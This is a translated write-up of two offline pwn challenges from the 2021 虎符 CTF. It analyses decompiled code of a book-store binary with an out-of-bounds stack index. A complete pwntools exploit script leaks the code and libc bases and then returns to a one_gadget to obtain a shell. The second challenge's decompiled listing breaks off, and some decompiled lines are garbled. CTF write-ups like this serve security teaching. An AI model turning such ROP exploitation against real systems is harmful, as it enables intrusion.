# 虎符2021线下pwn题解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## PWN1——JDF
###  分析
首先看一下保护和版本
题目为`64位`程序，保护全开，Libc版本为 `2.23`
    ❯ checksec jdt
    [*] '/home/n1k0/work/ctf/pwn/race/2021HFCTF/pwn1/jdt'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
打开IDA看一下，这道题乍一看有点像传统的堆表单题，但仔细分析的话发现其实并没有涉及到堆
我们先来看下`菜单`
题目模拟的是一个卖书软件，功能包括 `创建` `编辑` `输出信息` `卖书`和 `退出`
    {
      puts("1.Create Books");
      puts("2.Edit Books");
      puts("3.Show Books");
      puts("4.Sell Books");
      puts("5.Exit");
      return printf("Choice: ");
    }
进入函数分析一下这些功能
**add**
这个函数的作用是创建结构体的实例，并存入数组`s`中
这里需要注意的是数组`s`位于栈上，且每个元素的小小为 `OWORD`，即 `16字节`
该结构体每个实例大小为`40字节`，变量排布如下：
    {
        8B price
        8B flag
        16B name 
        16B author
        32B describtion
    }
在本题目中，最多可以创建16个结构体实例
    case 1LL:
            for ( i = 0; i  0x10 || *((_QWORD *)&s[5 * idx] + 1) == 1LL )
              error();
            printf("Price?");
            *(_QWORD *)&s[5 * idx] = input();
            printf("Author?");
            read(0, &s[5 * idx + 2], 0x10uLL);
            printf("Book's name?");
            read(0, &s[5 * idx + 1], 0x10uLL);
            printf("Description?");
            read(0, &s[5 * idx + 3], 0x20uLL);
            *((_QWORD *)&s[5 * idx] + 1) = 1LL;
            break;
**edit**
此函数的功能是编辑结构体实例，但这里存在漏洞
我们在创建实例时只能创建16个，末位编号为 `0xf`
但在编辑时却能编辑编号为 `0x10`的实例，这就造成越界写
    case 2LL:
            printf("idx?");
            idx = input();
            if ( idx > 0x10 || !*((_QWORD *)&s[5 * idx] + 1) )
              error();
            printf("[1.Edit Price][2.Edit Author][3.Edit Book's Name][4.Edit Description]\nChoice: ");
            v0 = input();
            choice = v0;
            if ( v0 == 2 )
            {
              printf("Author?");
              read(0, &s[5 * idx + 2], 0x10uLL);
            }
            else if ( v0 > 2 )
            {
              if ( v0 == 3 )
              {
                printf("Book's Name?");
                read(0, &s[5 * idx + 1], 0x10uLL);
              }
              else
              {
                if ( v0 != 4 )
                  goto LABEL_35;
                printf("Description?");
                read(0, &s[5 * idx + 3], 0x20uLL);
              }
            }
            else
            {
              if ( v0 != 1 )
                goto LABEL_35;
              printf("Price?");
              *(_QWORD *)&s[5 * idx] = input();
            }
            break;
**show**
和 `edit`一样，`show`功能也存在越界问题，可以输出`rbp`前后的数据
    case 3LL:
            printf("idx?");
            idx = input();
            if ( idx > 0x10 || !*((_QWORD *)&s[5 * idx] + 1) )
              error();
            printf(
              "[%llu]\nPrice: %llu\nAuthor: %s\nBook's Name: %s\nDescription: %s\n",
              idx,
              *(_QWORD *)&s[5 * idx],
              (const char *)&s[5 * idx + 2],
              (const char *)&s[5 * idx + 1],
              (const char *)&s[5 * idx + 3]);
            break;
###  思路
找到漏洞点后，我们就可以开始构思如何 `Get shell`了
目前的漏洞是越界读和越界写，可以更改 `rbp`附近包含 `返回值`在内的数据，但由于程序开启了 `PIE`保护，因此我们首先要泄露
`code_base`和 `libc_base`
通过观察 `实例16`中的数据可以发现，在 `price变量`的位置遗留有包含 `code_base`的地址，可以通过 `show(16)`泄露
`code_base`
有了 `code_base`之后，我们就可以利用题目中的 `gadget`修改返回值来泄露libc地址
最后在获得 `libc_base`后即可通过 `one_gadgets`来 `Get Shell`
**思路总结**
  * 通过 `show`越界读获得 `code_base`
  * 通过 `edit`越界写使用题目中的 `pop rdi; ret`和 `puts`函数修改返回值，获得 `libc_base`
  * 使用 `one_gadgets`修改返回值， `Get shell`
详见EXP
###  EXP
    #!/usr/bin/python
    #coding=utf-8
    #__author__:N1K0_
    from pwn import *
    import inspect
    from sys import argv
    def leak(var):
        callers_local_vars = inspect.currentframe().f_back.f_locals.items()
        temp =  [var_name for var_name, var_val in callers_local_vars if var_val is var][0]
        p.info(temp + ': {:#x}'.format(var))
    s      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    r      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, b'\0'))
    uu64    = lambda data               :u64(data.ljust(8, b'\0'))
    plt     = lambda data               :elf.plt[data]
    got     = lambda data               :elf.got[data]
    sym     = lambda data               :libc.sym[data]
    inf     = lambda data               :success(data)
    itr     = lambda                    :p.interactive()
    local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
    local_libc_32 = '/lib/i386-linux-gnu/libc.so.6'
    remote_libc = ''
    binary = './jdt'
    context.binary = binary
    elf = ELF(binary,checksec=False)
    p = process(binary)
    if len(argv) > 1:
        if argv[1]=='r':
            p = remote('',)
    libc = elf.libc
    # libc = ELF(remote_libc)
    def dbg(cmd=''):
        os.system('tmux set mouse on')
        context.terminal = ['tmux','splitw','-h']
        gdb.attach(p,cmd)
        pause()
    # start 
    """
    puts("1.Create Books");
    puts("2.Edit Books");
    puts("3.Show Books");
    puts("4.Sell Books");
    puts("5.Exit");
    struct
        {
        8 price
        8 flag
        16 name 
        16 author
        32 describtion
        }
    s : $rbp-0x510
    """
    # context.log_level = 'DEBUG'
    def add(price,author,name,des):
        sa('Choice: ','1')
        sa('Price?',str(price))
        sa('Author?',author)
        sa('s name?',name)
        sa('Description?',des)
    def edit(idx,choice,data):
        sa('Choice: ','2')
        sa('idx?',str(idx))
        sla('[4.Edit Description]\nChoice: ',str(choice))
        sa('?',str(data))
    def free(idx):
        sa('Choice: ','4')
        sa('idx?',str(idx))
    def show(idx):
        sa('Choice: ','3')
        sa('idx?',str(idx))
    def exit():
        sa('Choice: ','5')
    comm = 'b *$rebase(0x1090)\n' # show
    comm+= 'b *$rebase(0x1129)\n' # exit
    comm+= 'b *$rebase(0x11e3)\n' # pop_rdi
    comm+= 'b *0x7ffff7a523a0\n'  # system
    show(16)
    ru('Price: ')
    code = int(ru('\n'),10) - 0x8c0
    leak(code)
    p_rdi_r = code + 0x11e3
    edit(16,3,'a'*8+p64(p_rdi_r))
    edit(16,2,p64(code+got('puts'))+p64(code+0xa88)) # puts(puts_got)
    edit(16,4,p64(code+0x115f)*2) # main
    exit()
    puts = uu64(ru('\x7f',False)[-6:])
    base = puts - 0x6f6a0
    leak(base)
    leak(puts)
    one = [0x45226,0x4527a,0xf0364,0xf1207]
    edit(16,3,'a'*8+p64(base+one[0]))
    # dbg(comm)
    exit()
    # end 
    itr()
## PWN2——message
###  程序分析
题目的核心部分如下：
    void __fastcall main(__int64 a1, char **a2, char **a3)
    {
      __int64 v3; // rax
      _QWORD *v4; // rbx
      __int64 v5; // rax
      _QWORD *v6; // rbx
      __int64 v7; // rax
      __int64 v8; // rax
      __int64 v9; // rax
      __int64 v10; // rax
      __int64 v11; // rax
      char *time; // r13
      __int64 pho_num; // rbx
      __int64 msg; // r12
      __int64 v15; // rax
      __int64 v16; // rax
      __int64 v17; // rax
      __int64 v18; // rax
      __int64 v19; // rax
      __int64 v20; // rax
      __int64 v21; // rax
      __int64 v22; // rax
      __int64 v23; // rax
      __int64 v24; // rax
      __int64 v25; // rax
      __int64 v26; // rax
      __int64 v27; // rax
      signed int v28; // [rsp+4h] [rbp-3Ch]
      unsigned __int64 idx; // [rsp+8h] [rbp-38h]
      unsigned __int64 size; // [rsp+18h] [rbp-28h]
      __int64 savedregs; // [rsp+40h] [rbp+0h]
      idx = 0LL;
      init_(a1, a2, a3);
      welcome();
      while ( 1 )
      {
        menu();
        input_int();
        switch ( (unsigned __int64)&savedregs )
        {
          case 1uLL:
            v28 = 0;
            break;
          case 2uLL:                                // edit message
            std::operator>(&std::cout, "Please tell me idx:");
            idx = input_int();
            if ( idx >(&std::cout, "New Message: ");
              std::istream::getline(
                (std::istream *)&std::cin,
                *((char **)message_list[idx] + 2),
                *(_QWORD *)message_list[idx]);
            }
            else
            {
              v7 = std::operator>(&std::cout, "Wrong idx");
              std::ostream::operator>);
            }
            continue;
          case 3uLL:                                // edit time
            std::operator>(&std::cout, "Please tell me idx:");
            idx = input_int();
            if ( idx >(&std::cout, "New Time: ");
              std::istream::getline((std::istream *)&std::cin, (char *)message_list[idx] + 8, 8LL);
            }
            else